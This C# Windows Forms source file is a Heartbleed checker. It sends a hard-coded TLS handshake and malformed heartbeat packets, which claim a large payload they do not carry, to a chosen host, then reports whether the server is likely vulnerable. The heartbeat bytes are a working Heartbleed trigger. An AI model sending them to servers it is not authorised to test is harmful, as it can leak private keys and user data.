using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;

namespace HeartBleedCheck
{
    public partial class Form1 : Form
    {
        static byte[] FirstPacket = new byte[]
        {
            0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06, 0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01, 0x01
        };

        static byte[] HeartbeatPacket = new byte[]
        {
            0x18, 0x03, 0x02, 0x00, 0x03, 0x01, 0x40, 0x00
        };

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Check_Click(object sender, EventArgs e)
        {
            byte[] resb = null;
            byte[] buffer = null;
            TcpClient client = null;
            String host = "";
            Int32 port = (int)portnum.Value;
            result.Text = "Checking...";
            result.Update();
            result.Refresh();
            Application.DoEvents();
            if (radioButton1.Checked) host = ip1.Value + "." + ip2.Value + "." + ip3.Value + "." + ip4.Value;
            else host = textBox1.Text;
            try
            {
                client = new TcpClient(host, port);
            }
            catch
            {
                result.Text = "Could not connect to server. (does it support SSL?)";
                return;
            }
            using (var stream = client.GetStream())
            {
                try
                {
                    stream.Write(FirstPacket);
                    stream.Write(HeartbeatPacket);
                    stream.Write(HeartbeatPacket);
                }
                catch(Exception e1)
                {
                    if (showtec.Checked) result.Text = "Error: " + e1.Message;
                    else result.Text = "Error while sending packets to that server.";
                }
                try
                {
                    if(showtec.Checked) result.Text = "Replies: ";
                    for (int i = 0; i < 10; i++)
                    {
                        buffer = null;
                        buffer = stream.Read(0x10000 + 0x3);
                        resb = buffer.ToArray();
                        if (resb != null)
                        {
                            if (resb.Length > 2)
                            {
                                if (showtec.Checked)
                                {
                                    result.Text += "Type: " + resb[0] + ", Length: " + resb.Length + " ";
                                    result.Update();
                                    result.Refresh();
                                    Application.DoEvents();
                                }
                                else
                                {
                                    if (resb[0] == 21) { result.Text = "Server has been patched and is safe."; break; }
                                    else if (resb[0] == 24) { result.Text = "Server replied with [" + resb.Length + "] bytes and is likely vulnerable."; break; }
                                    else result.Text = "Server returned unknown packet type [" + resb[0] + "] which means it is likely safe."; 
                                }
                            }
                        }
                        else
                        {
                            result.Text = "No reply.";
                            break;
                        }
                    }
                }
                catch(Exception e2)
                {
                    if (showtec.Checked) result.Text = "Error: " + e2.Message; 
                    else result.Text = "Server returned an error and is likely not vulnerable.";
                }
            }
            if (result.Text == "Checking...") result.Text = "No reply."; ;
            if (client != null)
            {
                client.Close();
            }
        }
    }
}
